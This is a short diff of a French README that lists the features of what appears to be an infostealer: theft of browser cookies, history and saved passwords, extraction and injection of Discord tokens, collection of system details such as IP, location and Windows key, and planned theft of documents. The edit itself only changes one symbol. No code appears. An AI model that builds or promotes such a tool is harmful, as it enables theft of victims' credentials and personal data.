@@ -15,7 +15,7 @@
   - Fichiers `.txt`, `.docx`, `.pdf` depuis le Bureau et Documents. ( bientot )
 - 🌐 Vol de données navigateur :
   - Cookies, historique, mots de passe sauvegardés (Chrome, Opera GX, Edge).
-- 💬 Extraction de tokens = injection :
+- 💬 Extraction de tokens + injection :
   - Discord (toutes les versions installées).
 - 🪪 Informations système :
   - Nom d'utilisateur, adresse IP, localisation, clé Windows.
